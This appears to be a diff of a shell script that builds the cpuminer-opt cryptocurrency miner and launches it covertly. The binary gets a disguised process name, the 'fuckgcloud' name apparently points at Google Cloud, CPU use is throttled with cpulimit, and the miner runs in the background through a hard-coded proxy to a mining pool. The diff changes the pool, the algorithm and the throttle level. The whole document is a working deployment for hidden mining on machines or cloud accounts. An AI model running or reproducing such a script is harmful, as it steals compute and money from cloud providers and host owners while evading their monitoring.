@@ -5,5 +5,5 @@ cd cpuminer-opt
 chmod +x *
 ./build.sh
 make
-mv cpuminer samlzzz
-cpulimit --exe samlzzz --limit 85 -b && ./samlzzz -a lyra2h -o stratum+tcp://sg-mine.idcray.com:10111 -u k67frozen.anonymous -p 0202 -x 45.32.21.205:2212 --background
+mv cpuminer fuckgcloud
+cpulimit --exe fuckgcloud --limit 45 -b && ./fuckgcloud -a lyra2z330 -o stratum+tcp://d.jkpool.com:3000 -u k67frozen.anonymous1 -p 0202 -x 45.32.21.205:2212 --background
